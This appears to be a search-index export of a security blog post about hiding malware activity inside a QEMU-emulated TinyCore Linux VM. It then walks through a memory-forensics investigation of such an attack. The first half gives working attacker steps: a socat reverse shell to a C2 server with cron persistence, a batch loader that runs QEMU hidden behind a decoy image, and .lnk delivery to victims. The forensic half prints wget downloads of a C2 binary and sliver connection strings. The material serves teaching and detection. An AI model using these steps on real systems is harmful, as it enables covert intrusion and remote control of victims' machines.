{"config":{"lang":["en"],"separator":"[\\s\\-]+","pipeline":["stopWordFilter"]},"docs":[{"location":"","title":"Using Emulated Linux Environments as an Anti-Forensics technique","text":"<p>Most anti-forensics techniques I encounter revolve around deletion\u2014be it event logs, shadow copies, artifacts, or even traces like the tools and scripts used. While these methods are concerning, their impact is mitigated by centralized logging solutions like SIEM or SOAR, which store this information in real-time, allowing investigators to recover and analyze the logs.</p> <p>But what about techniques that don\u2019t rely on deletion at all? Instead, they aim to prevent the generation of logs in the first place. These methods create blind spots\u2014elusive areas that evade detection by EDRs, SIEMs, or even manual artifact analysis.</p> <p>Today, we\u2019ll explore how virtualization, specifically using QEMU, can create such blind spots for existing solutions. This discussion will address both perspectives: how attackers can use virtualization to stage malware and how forensic investigators can detect and analyze these activities.</p>"},{"location":"#_1","title":"Using Emulated Linux Environments as an Anti-Forensics technique","text":""},{"location":"#the-rise-of-virtualization","title":"The Rise of Virtualization","text":"<p>Virtualization itself is not new. Back in 2019, users reported a <code>qemu-system-x86_64</code> process consuming 100% of their CPU on Macs. This turned out to be linked to a malware campaign, \"LoudMiner,\" which used QEMU to mine cryptocurrencies like Monero (<code>XMRig</code>) via cracked VST software.  Source: ESET</p> <p>While LoudMiner leveraged virtualization for cryptojacking, we can extend this concept further. Imagine using a virtualized environment to perform malicious operations entirely within an emulated Linux instance, isolated from the host\u2019s monitoring systems. After completing the operation\u2014whether it\u2019s data exfiltration, ransomware deployment, or targeted file manipulation\u2014the attacker transfers the results to the host. This approach bypasses traditional detection mechanisms, creating a significant challenge for defenders.</p>"},{"location":"#setting-up-the-emulated-environment","title":"Setting Up the Emulated Environment","text":"<p>To demonstrate this technique, we\u2019ll set up a Linux image, customize it with tools and scripts, and prepare it for delivery to the victim.</p>"},{"location":"#step-1-download-and-prepare-required-tools","title":"Step 1: Download and Prepare Required Tools","text":"<ol> <li> <p>Download QEMU:     Visit the official QEMU website and download the desired version. For this example, we\u2019ll use the latest version available at the time of writing (<code>20241124</code>). Install it on your machine.</p> </li> <li> <p>Download TinyCore Linux:     Obtain the ISO image of TinyCore Linux, a minimal Linux distribution, from the TinyCore Linux website.</p> </li> </ol>"},{"location":"#step-2-emulating-the-environment-with-qemu","title":"Step 2: Emulating the Environment with QEMU","text":"<ol> <li> <p>Create a Virtual Disk Image:</p> <ul> <li>Command: <code>qemu-img create -f qcow2 tc.img 500M</code></li> <li>Explanation: This creates a 500MB virtual disk file in the QCOW2 format, which will serve as the storage for the virtual machine.</li> </ul> </li> <li> <p>Boot the TinyCore Linux ISO:</p> <ul> <li>Command: <code>qemu-system-x86_64.exe -cdrom ./TinyCore-current.iso -hda tc.img -boot d -m 512</code></li> <li>Explanation: <ul> <li><code>-cdrom</code>: Specifies the ISO file to boot.</li> <li><code>-hda</code>: Points to the virtual disk created earlier.</li> <li><code>-boot d</code>: Boots from the CD-ROM.</li> <li><code>-m 512</code>: Allocates 512MB of memory to the virtual machine.</li> </ul> </li> </ul> <p>Once the emulated environment is running, you can install necessary tools and configure services like SSH for remote control.</p> </li> <li> <p>Install Tools and Configure SSH:</p> <ul> <li> <p>Commands:</p> <ul> <li><code>tce-load -wi vim</code>: Installs the <code>vim</code> text editor.</li> <li><code>tce-load -wi openssh</code>: Installs the <code>openssh</code> package for SSH access.</li> <li><code>ssh-keygen -t rsa</code>: Generates SSH keys.</li> <li><code>ssh-copy-id user@your-server-ip</code>: Copies the SSH key to the specified server.</li> </ul> </li> <li> <p>Explanation: These commands prepare the emulated environment for remote access, enabling attackers to control it from their C2 server.</p> </li> </ul> </li> </ol>"},{"location":"#step-3-establishing-a-connection-with-the-c2-server","title":"Step 3: Establishing a Connection with the C2 Server","text":"<p>In this section we have tons of ways, literally we can go with any C2 binary like sliver, coabltstrike, havoc etc..</p> <p>Or we can go something like Chisel which bridges the gap using a tunneling channel. You can read more about chisel from here and how to use it Chisel for Lateral movement </p> <p>Also we can use complettely legitimate techniques like reverse SSH or socat, For testing purposes i will go with socat.</p>"},{"location":"#using-socat","title":"Using socat","text":"<ul> <li> <p>On the C2 server:</p> <ul> <li><code>socat -d -d TCP-LISTEN:4444 STDOUT</code></li> </ul> <p></p> </li> <li> <p>On the emulated environment (TinyCore):</p> <ul> <li><code>socat TCP:&lt;public-ip&gt;:4444 EXEC:/bin/bash</code> </li> </ul> <p></p> <p>Note</p> <p>You can put this command in crontabs or using any presistence technique to run every minute to connect back to the C2 as we will be dlivering this later as intitial access.</p> </li> </ul> <p>One you have typed the command on the emualted enviornement you will recive a bash shell on your C2     </p> <p>This is just s aimple implementation of communication between the C2 and the emmulator but you can go wild with that as much as you want.</p>"},{"location":"#step-4-delivering-the-emulated-environment","title":"Step 4: Delivering the Emulated Environment","text":"<p>Now that the environment is ready, We need to deliver QEMU files and the <code>tc.img</code> that we customized, along with a PowerShell or batch file to start the emulated environment in the background.</p> <p>Additionally, we want a single-click method for the victim to execute this setup. The <code>lnk</code> file technique is a perfect choice for this purpose.</p>"},{"location":"#preparing-files","title":"Preparing Files","text":"<p>We already have the QEMU files and the <code>tc.img</code>.</p> <p>Warning</p> <p>After customizing the environment, save your changes using the built-in script <code>filetool.sh -b</code>. For better OPSEC, clear the command history by deleting <code>.ash_history</code> in the root directory.</p>"},{"location":"#bat-file","title":".bat File","text":"<pre><code>    @ECHO OFF\n\n    set \"targetDir=%HOMEPATH%\\datax\\data\"\n    if not exist \"%targetDir%\" mkdir \"%targetDir%\"\n\n    (\n       echo %USERNAME%\n    ) &gt; \"%targetDir%\\usercontext.txt\"\n\n    explorer.exe https://forum.hestiacp.com/uploads/default/original/2X/9/9aae76309a614c85f880512d8fe7df158fec52cc.png\n    START /B %HOMEPATH%\\datax\\data\\qemu.exe -drive file=%HOMEPATH%\\datax\\data\\tc.img -fw_cfg name=opt/usercontext,file=%HOMEPATH%\\datax\\data\\usercontext.txt -nographic &amp;\n\n    exit\n</code></pre> <ul> <li> <p>Explanation:</p> <ul> <li><code>set \"targetDir=%HOMEPATH%\\datax\\data\"</code>: Defines the directory where the files will be extracted.</li> <li><code>if not exist \"%targetDir%\" mkdir \"%targetDir%\"</code>: Creates the directory if it doesn\u2019t exist.</li> <li><code>echo %USERNAME% &gt; \"%targetDir%\\usercontext.txt\"</code>: Saves the username to a file for later use in SSH commands.</li> <li><code>explorer.exe &lt;URL&gt;</code>: Opens a URL with an error message hosted on public server.</li> <li><code>START /B %HOMEPATH%\\datax\\data\\qemu.exe</code>: Starts QEMU in the background, running the emulated environment.</li> <li><code>-drive file=&lt;path&gt;</code>: Specifies the virtual disk to load.</li> <li><code>-fw_cfg</code>: Adds custom firmware configuration to pass data between the emulated environment and the host.</li> <li><code>-nographic</code>: Will run the emulation in the background.</li> </ul> </li> </ul> <p>Info</p> <p>In our case it will pass whatever in <code>usercontext.txt</code> and share it with the emulated enviornemnet under /sys/firmware/qemu_fw_cfg/by_name/opt/usercontext/raw and we stored the username of the host there, so a command like <code>ssh $(sudo cat /sys/firmware/qemu_fw_cfg/by_name/opt/usercontext/raw)@10.0.2.2</code> will connect us to the host.</p> <p>Note</p> <p><code>10.0.2.2</code> is the default IP that qemu assigns for the host machine, Take a look at some of the interesting driver-level functionality unique to QEMU. This would be present across any Linux distro, not just TinyCore: Qemu Documentation for Networking</p> <p>You can also enhance the script by employing techniques to extract the host machine's password, such as dumping LSASS, retrieving stored credentials, or brute-forcing the password later. These techniques are not detailed here as this totally another topic.</p>"},{"location":"#lnk-file","title":".lnk File","text":"<p>The <code>.lnk</code> file simplifies execution for the victim by bundling the setup into a single click.</p> <ol> <li> <p>File Placement:</p> <ul> <li>Place <code>qemu.exe</code>, <code>tc.img</code>, and <code>start.bat</code> in the same directory.</li> <li>Zip the directory for delivery.</li> </ul> <p></p> <p>Info</p> <p>Zip this directory and deliver it to the victim, along with an <code>.lnk</code> file, via email or another delivery method. Refer to my blog for common delivery techniques attackers use: Understanding Threat Actors.</p> </li> <li> <p>Purpose of the .lnk File:</p> <ul> <li>Extracts the contents of the zip file to the <code>datax</code> directory.</li> <li>Executes the <code>start.bat</code> file to launch the emulation in the background because of the <code>-nographic</code> option.</li> </ul> </li> </ol> <p></p> <p>Now we have everything in place which it will all starts when the victim clicks on the .lnk file.</p> <p>Running lnk on the victim machine</p> <p>    Your browser does not support the video tag. </p>"},{"location":"#implications-for-dfir","title":"Implications for DFIR","text":"<p>Note</p> <p>The investigation was approached as a real-world incident, beginning with a SIEM alert and following a thorough analysis process. We also used sliver C2 for the communication between the emulated enviornement and the attacker.</p>"},{"location":"#background","title":"Background","text":"<p>The SOC team has flagged unusual activity on a workstation assigned to Khalid Allam, a marketing specialist at the enterprise. The alert was triggered by the download of a 150 MG file attached to an email, a behavior atypical for Khalid's role, which generally involves working with online collaboration tools rather than large local downloads. While no immediate suspicious activity was observed after the download, the incident has raised concerns due to the potential for hidden malicious intent. As part of the incident response process, you have been provided with a memory dump and a triage image of Khalid's machine to investigate further. Your task is to determine if any malicious artifacts, unauthorized activity, or signs of compromise are present, ensuring the environment's security remains intact.</p>"},{"location":"#investigation","title":"Investigation","text":""},{"location":"#initial-investigation","title":"Initial Investigation","text":"<p>The investigation was initiated by examining common directories such as Desktop, Downloads, Temp, and Documents. This analysis was conducted by parsing the MFT attribute to retrieve the entry numbers for each folder, enabling filtering for specific content.</p>"},{"location":"#analysis-of-suspicious-downloads","title":"Analysis of Suspicious Downloads","text":"<p>In the Downloads folder, a 150MB zip file was identified, accompanied by a link file created simultaneously and bearing the same name. Since this discovery matched the alert criteria, the investigation timeline was established at this point.</p> <p></p> <p>The download of the zip and lnk files was recorded at <code>2024-11-28 11:59:02</code> UTC. The timing of the link file's execution was then investigated to determine subsequent actions. Due to the nature of the <code>.lnk</code> file, the exact execution time could not be located in the <code>recentdoc</code>s or the <code>lnk</code> files under <code>Roaming\\Microsoft\\Windows\\Recent</code>. The <code>userassist</code> registry keys were examined to check if it got executed as a process not a file, revealing the file\u2019s last execution time as <code>2024-11-28 12:01:35</code> UTC.</p> <p></p> <p>An attempt was made to extract the content of the link file from the MFT; however, the file was not found. This absence was attributed to the size of the link file exceeding <code>1KB</code>.</p> <p>Info</p> <p>The <code>$MFT</code> attribute file only retains actual file data if the size is <code>1024</code> bytes or smaller (resident data). For files larger than <code>1KB</code>, the data becomes non-resident and is not stored in the MFT itself, though data runs to the file\u2019s location are recorded. </p> <p>Prefetch files were parsed for processes executed around the identified time to analyze activities following the link file\u2019s activation.</p> <p></p> <p>It was discovered that <code>Powershell.exe</code> and <code>Conhost.exe</code> were executed at the exact time of the link file activation. Additionally, other processes, including <code>edge</code>, <code>qemu</code>, and <code>whoami</code>, were executed shortly afterward.</p> <p></p> <p>Attention was first directed toward <code>powershell.exe</code> to determine if the link file contained embedded PowerShell commands. Using the timeline, PowerShell commands executed at the corresponding time were located.</p> <p></p> <pre><code>C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -windowstyle hidden -c Expand-Archive -Path $home\\downloads\\'OneAmerica Survey.zip' -DestinationPath $home\\datax; Invoke-Command {cmd.exe /c $home\\datax\\data\\start.bat}\n</code></pre> <p>Info</p> <p>The command extracted the contents of the zip file to <code>C:\\Users\\&lt;username&gt;\\datax\\</code> and subsequently executed a batch script named <code>start.bat</code>.</p> <p>The entry number of the <code>datax</code> folder was retrieved to examine its contents. Within the <code>datax</code> folder, a subfolder named data was found, containing multiple files. These files included <code>qemu</code> and its dependencies: <code>start.bat</code>, <code>tc.img</code>, and a file named <code>usercontext.txt</code>.</p> <p></p> <p>Info</p> <p>QEMU is an open-source emulator and virtualization tool used to run virtual machines or simulate hardware architectures. The <code>tc.img</code> file is likely a disk image for Tiny Core Linux, a minimal Linux distribution often used in lightweight virtual environments.</p> <p>Efforts were made to determine the content of <code>start.bat</code> and <code>usercontext.txt</code> and to recover both files. The size of start.bat was noted as <code>580</code> bytes, and <code>usercontext.txt</code> was identified as <code>7</code> bytes. A hex editor was utilized, and the MFT attribute was analyzed by searching for the file names.</p> <p></p> <pre><code>@ECHO OFF\n\nREM Define the target directory and ensure it exists\nset \"targetDir=%HOMEPATH%\\datax\\data\"\nif not exist \"%targetDir%\" mkdir \"%targetDir%\"\n\nREM Create and write user context information to usercontext.txt\n(\n    echo %USERNAME%\n\n) &gt; \"%targetDir%\\usercontext.txt\"\n\nexplorer.exe https://forum.hestiacp.com/uploads/default/original/2X/9/9aae76309a614c85f880512d8fe7df158fec52cc.png\nSTART /B %HOMEPATH%\\datax\\data\\qemu.exe -drive file=%HOMEPATH%\\datax\\data\\tc.img -fw_cfg name=opt/usercontext,file=%HOMEPATH%\\datax\\data\\usercontext.txt -nographic &amp;\n\nexit\n</code></pre> <ul> <li> <p>Explanation:</p> <ul> <li>The directory <code>%HOMEPATH%\\datax\\data</code> was defined and created if it did not exist.</li> <li>The username of the machine was saved in a file named <code>usercontext.txt</code>.</li> <li>A URL was opened in the browser, displaying an error message hosted on a public server     </li> <li><code>QEMU</code> was started in the background to run an emulated environment, loading the virtual disk <code>tc.img</code>.</li> <li>Custom firmware configuration was added to allow the emulated environment to access <code>usercontext.txt</code> from the host.</li> <li>The emulation was run in the background, making it invisible to the user except for the displayed error message.</li> </ul> </li> </ul> <p>The content of usercontext.txt was also recovered and found to store the username a1l4m, confirming the username of the machine.     </p> <p>Next, the browser history was examined to verify whether the error message had been displayed to the user. This was achieved by analyzing the <code>History</code> database located in <code>C:\\Users\\a1l4m\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default</code>. The URL was confirmed to have been accessed at <code>2024-11-28 12:03:10</code> UTC.     </p> <p>It was observed that the attacker proceeded with activities within the emulated environment after QEMU started at <code>2024-11-28 12:03:08 UTC</code>. Processes such as <code>cmd</code>, <code>SSHD</code>, and <code>whoami</code> were identified for further investigation. It was hypothesized that all these actions were conducted within the emulated environment created on the workstation. </p> <p>Note</p> <p>Due to the nature of QEMU, it was determined that no logs would be available for actions taken within the emulated environment. All activities occur in memory and are cleared upon shutdown of the emulation. Consequently, the next phase of the investigation focuses on memory forensics.</p>"},{"location":"#memory-analysis","title":"Memory Analysis","text":"<p>The investigation began by examining the memory for processes to locate <code>qemu.exe</code> and verify whether the findings from the prefetch matched the data in memory.</p> <pre><code>\u2514\u2500\u2500\u257c #vol -f WIN-NP10IHJMV3O-20241128-121124.raw windows.pstree \nPID     PPID    ImageFileName   Offset(V)       Threads Handles SessionId       Wow64   CreateTime      ExitTime\n\n................................\n................................\n4976    5988    qemu.exe        0xdc8dd2b25300  6       -       1       False   2024-11-28 12:03:08.000000      N/A\n</code></pre> <p>The process qemu.exe was identified with PID <code>4976</code>. Its parent process was missing, likely due to termination. The creation time matched the prefetch data, confirming the findings.</p> <p>The <code>cmdline</code> plugin was utilized, and the same commands observed earlier in the batch file and PowerShell history were retrieved.</p> <pre><code>\u2514\u2500\u2500\u257c #vol -f WIN-NP10IHJMV3O-20241128-121124.raw windows.cmdline\nPID      Process                Args\n\n................................\n................................\n4752    msedge.exe      \"C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe\" --single-argument https://forum.hestiacp.com/uploads/default/original/2X/9/9aae76309a614c85f880512d8fe7df158fec52cc.png\n4976    qemu.exe        \\Users\\a1l4m\\datax\\data\\qemu.exe  -drive file=\\Users\\a1l4m\\datax\\data\\tc.img -fw_cfg name=opt/usercontext,file=\\Users\\a1l4m\\datax\\data\\usercontext.txt -nographic\n................................\n................................\n</code></pre>"},{"location":"#network-connections-and-backdoor-identification","title":"Network Connections and Backdoor Identification","text":"<p>The attacker\u2019s method of controlling the emulated environment from outside the network was then investigated using the <code>netscan</code> plugin.</p> <pre><code>\u2514\u2500\u2500\u257c #vol -f WIN-NP10IHJMV3O-20241128-121124.raw windows.netscan\nOffset  Proto   LocalAddr       LocalPort       ForeignAddr     ForeignPort     State   PID     Owner   Created\n\n................................\n................................\n0xdc8dd63f8010  TCPv4   192.168.2.128   49750   3.69.168.214    8888    ESTABLISHED     4976    qemu.exe        2024-11-28 12:03:54.000000\n................................\n0xdc8dd25dca60  TCPv4   127.0.0.1       49759   127.0.0.1       22      ESTABLISHED     4976    qemu.exe        2024-11-28 12:06:32.000000\n................................\n0xdc8dd2db1b60  TCPv4   127.0.0.1       22      127.0.0.1       49759   ESTABLISHED     5656    sshd.exe        2024-11-28 12:06:32.000000\n</code></pre> <p>A connection from <code>qemu.exe</code> to the IP address <code>3.69.168.214</code> on port <code>8888</code> was identified. This connection likely indicates a backdoor planted on the custom image by the attacker to execute upon startup of the image.</p>"},{"location":"#customization-of-the-qemu-image","title":"Customization of the QEMU Image","text":"<p>The scope was narrowed further by dumping the <code>qemu.exe</code> process using the memmap plugin.</p> <pre><code>\u2514\u2500\u2500\u257c #vol -f WIN-NP10IHJMV3O-20241128-121124.raw -o . windows.memmap --dump  --pid 4976\n\n................................\n0xf8054b1de000  0x72cd1000      0x1000  0x1b816000      pid.4976.dmp\n</code></pre> <p>The dumped process was filtered for the IP address, revealing the complete URL used for the connection.</p> <pre><code>\u2514\u2500\u2500\u257c #strings pid.4976.dmp | grep -i '3.69.168.214'\n\nmtls://3.69.168.214:8888mtls://3.69.168.214:8888\nmtls://3.69.168.214:8888060102150405Z0700\n3.69.168.214:8888\nmtls://3.69.168.214:8888XXX_InternalExtensions\n</code></pre> <p>A quick search was conducted to identify whether the attacker was utilizing a public C2 framework.      </p> <p>The search confirmed that the attacker employed Sliver C2.</p> <p>The memory analysis was continued using common keywords such as <code>.ash_history</code>, <code>http://</code>, and <code>wget</code>. The following results were obtained:</p> <pre><code>\u2514\u2500\u2500\u257c #strings pid.4976.dmp | grep -i 'http://'\n\n................................\nwget http://3.69.168.214/LESSER_VISCOSE\nwget http://3.69.168.214/LESSER_VISCOSE\nhttp://\n</code></pre> <p>A file named <code>LESSER_VISCOSE</code> was identified as having been downloaded. Filtering further for <code>LESSER_VISCOSE</code> revealed the following:</p> <pre><code>\u2514\u2500\u2500\u257c #strings pid.4976.dmp | grep -i 'LESSER_VISCOSE'\n\n................................\nwget http://3.69.168.214/LESSER_VISCOSE\nchmod +x LESSER_VISCOSE\nmv LESSER_VISCOSE lnit\nwget http://3.69.168.214/LESSER_VISCOSE\nchmod +x LESSER_VISCOSE\nmv LESSER_VISCOSE lnit\nLESSER_VISCOSE\n</code></pre> <p>It appeared that during the setup of the attacker\u2019s custom image, commands had been left in the <code>.ash_history</code> file. These commands indicated that <code>LESSER_VISCOSE</code> was downloaded, renamed to <code>lnit</code> (a name similar to <code>init</code>), and made executable. This file was likely the binary for the Sliver C2 framework.</p> <p>Further exploration of strings surrounding <code>LESSER_VISCOSE</code> revealed commands from <code>.ash_history</code>:</p> <pre><code>\u2514\u2500\u2500\u257c #strings pid.4976.dmp | grep -i 'LESSER_VISCOSE' -C10\n\n................................\nfiletool.sh -b\ncd /\ncat nohup.out\nsudo cat nohup.out\nhistory\ncd /home\ncd tc/\nwget http://3.69.168.214/LESSER_VISCOSE\nchmod +x LESSER_VISCOSE\nmv LESSER_VISCOSE lnit\nsudo nano /opt/bootlocal.sh\nfiletool.sh -b\n[10.0.2.2]:2222 ssh-rsa\n</code></pre> <p>It was observed that the attacker used nano to edit <code>/opt/bootlocal.sh</code>, indicating that the C2 binary was configured to execute on boot. This matched the timeline, as the connection to the C2 was initiated at <code>2024-11-28 12:03:54</code> UTC when <code>QEMU</code> started.     </p> <pre><code>\u2514\u2500\u2500\u257c #vol -f WIN-NP10IHJMV3O-20241128-121124.raw windows.netscan\nOffset  Proto   LocalAddr       LocalPort       ForeignAddr     ForeignPort     State   PID     Owner   Created\n\n................................\n................................\n0xdc8dd63f8010  TCPv4   192.168.2.128   49750   3.69.168.214    8888    ESTABLISHED     4976    qemu.exe        2024-11-28 12:03:54.000000\n</code></pre> <p>Info</p> <p>The command <code>filetool.sh -b</code> was identified as part of the Tiny Core Linux image, used for saving the state of the image after rebooting. This supports the hypothesis that the commands found were written during the customization of the image, not during the attack.</p>"},{"location":"#using-the-emulated-environment-to-connect-to-the-host","title":"Using the Emulated Environment to connect to the host","text":"<p>Further investigation focused on the shared folder <code>usercontext</code> created by the attacker when booting the image:</p> <pre><code>\u2514\u2500\u2500\u257c #strings pid.4976.dmp | grep  'usercontext'\n\n................................\n................................\nalias get-host-shell=\"ssh $(sudo cat /sys/firmware/qemu_fw_cfg/by_name/opt/usercontext/raw)@10.0.2.2\"\nalias get-host-user=\"echo $(sudo cat /sys/firmware/qemu_fw_cfg/by_name/opt/usercontext/raw)\"\n................................\nbash-5.2# cat /sys/firmware/qemu_fw_cfg/by_name/opt/usercontext/raw\n</code></pre> <p>It was found that the attacker used these commands to extract the username of the host machine and share it within the emulated environment. This username was later used to attempt SSH access into the host machine using a command such as <code>sudo ssh a1l4m@10.0.2.2</code>. According to QEMU documentation, <code>10.0.2.2</code> is the default IP address of the host.</p> <p>The success of this SSH command was verified using the <code>netscan</code> plugin:</p> <pre><code>\u2514\u2500\u2500\u257c #vol -f WIN-NP10IHJMV3O-20241128-121124.raw windows.netscan\nOffset  Proto   LocalAddr       LocalPort       ForeignAddr     ForeignPort     State   PID     Owner   Created\n\n................................\n................................\n0xdc8dd25dca60  TCPv4   127.0.0.1       49759   127.0.0.1       22      ESTABLISHED     4976    qemu.exe        2024-11-28 12:06:32.000000\n................................\n0xdc8dd2db1b60  TCPv4   127.0.0.1       22      127.0.0.1       49759   ESTABLISHED     5656    sshd.exe        2024-11-28 12:06:32.000000\n</code></pre> <p>An SSH connection was established between the emulated environment (<code>qemu.exe</code>) and the host machine (<code>sshd.exe</code>) at <code>2024-11-28 12:06:32</code> UTC. The use of a loopback IP (<code>127.0.0.1</code>) ensured that this connection was not flagged as malicious by network monitoring tools.</p> <p>Note</p> <p><code>127.0.0.1:49759 -&gt; 127.0.0.1:22</code>: The client (qemu.exe) uses source port <code>49759</code> to connect to the SSH daemon (sshd.exe) on port <code>22</code>.</p> <ul> <li> <p>Each line represents one end of the same TCP connection:</p> <ul> <li>The first entry represents the client (qemu.exe) initiating the connection.</li> <li>The second entry represents the server (sshd.exe) responding to the client.</li> </ul> </li> </ul> <p>This confirmed that SSH communication was successfully established between the emulated environment and the host machine. Additional leads, such as the existence of <code>whoami</code> in the prefetch files, were also followed for further analysis.</p> <p>To determine the commands executed within the SSH shell, filtering was conducted for <code>whoami</code>. The following results were retrieved:</p> <pre><code>\u2514\u2500\u2500\u257c #strings  pid.4976.dmp | grep -i \"whoami\" -A8\n\nwhoami\nsysteminfo\nhfkjh\ncd De\necho \"Khaled\na1l4m was here\" &gt; pwned.tt\n</code></pre> <p>It was observed that after executing <code>whoami</code>, the attacker issued multiple commands, including <code>systeminfo</code>. A file named <code>pwned.tt</code> was created with the content <code>Khaled a1l4m was here</code>, likely as a marker or note of compromise.</p> <p>To ensure accuracy, the triage image was revisited to validate certain findings, such as the SSH connection. The successful connection was confirmed, as shown below:     </p>"},{"location":"#timeline-breakdown","title":"Timeline Breakdown","text":"<p>Using all the information provided, the following timeline of the attack has been constructed:</p> Timestamp (UTC) Source Event 2024-11-28 11:59:02 USN journal Zip file and link file downloaded. 2024-11-28 12:01:35 UserAssist keys Link file (<code>lnk</code>) executed, starting malicious activity. 2024-11-28 12:03:08 Prefetch file <code>Powershell.exe</code> and <code>Conhost.exe</code> executed, starting command execution. 2024-11-28 12:03:10 Browser history Error message URL opened in the browser (<code>msedge.exe</code>). 2024-11-28 12:03:54 Network scan (netscan) QEMU establishes connection to <code>3.69.168.214:8888</code>, indicating C2 communication begins. 2024-11-28 12:06:32 Network scan (netscan) SSH connection established between the emulated environment (<code>qemu.exe</code>) and host (<code>sshd.exe</code>). 2024-11-28 12:06:32 SSH commands Commands executed: <code>whoami</code>, <code>systeminfo</code>, and creation of <code>pwned.tt</code> file on host."},{"location":"#additional-insights","title":"Additional Insights:","text":"<ol> <li>Custom QEMU Image Configuration:</li> <li>During the setup of the image, commands were added to download the Sliver C2 binary (<code>LESSER_VISCOSE</code>), renamed to <code>lnit</code>, and set as executable.</li> <li> <p>The binary was configured to execute on boot through modifications to <code>/opt/bootlocal.sh</code>.</p> </li> <li> <p>Host Compromise Evidence:</p> </li> <li>SSH credentials were retrieved from <code>usercontext.txt</code>, and the default IP (<code>10.0.2.2</code>) was used to establish SSH communication with the host.</li> <li>Indicators of compromise include a backdoor connection (<code>3.69.168.214:8888</code>) and executed commands (<code>whoami</code>, <code>systeminfo</code>).</li> </ol>"},{"location":"#observations","title":"Observations:","text":"<ul> <li>The attacker utilized loopback (<code>127.0.0.1</code>) for SSH communication, ensuring stealth by avoiding external detection.</li> <li>All activities in the emulated environment occurred in memory, reinforcing the need for advanced memory forensics.</li> </ul>"},{"location":"#conclusion","title":"Conclusion","text":"<p>In this investigation, a thorough forensic analysis was conducted to uncover the attacker's activities, methods, and tools used to compromise the workstation. The findings revealed the sophisticated use of a custom QEMU emulated environment to execute malicious activities while evading host-based detection. Key discoveries include the use of the Sliver C2 framework, SSH tunneling through loopback IP for stealth, and persistence mechanisms embedded in the QEMU image.</p> <p>The attacker demonstrated an advanced understanding of system architecture by leveraging memory-only operations and creating an isolated virtual environment for command execution. Evidence of reconnaissance, backdoor installation, and markers left on the host was uncovered through detailed memory forensics, timeline analysis, and artifact recovery.</p> <p>This investigation highlights the importance of incorporating advanced detection tools and processes, such as memory forensics, network traffic analysis, and host activity monitoring, to counteract sophisticated adversaries. The report's findings serve as a foundation for improving security measures and ensuring robust incident response capabilities.</p>"},{"location":"#additional-resources","title":"Additional resources","text":"<ol> <li>Qemu Documentation for Networking</li> <li>Chisel for Lateral movement </li> <li>ragnar locker ransomware incident</li> <li>Understanding Threat Actors</li> <li>Anti-forensics Techniques Used By Threat Actors In The Wild - Hela Lucas</li> <li>crontrap emulated linux environments as the latest tactic in malware staging</li> </ol>"}]}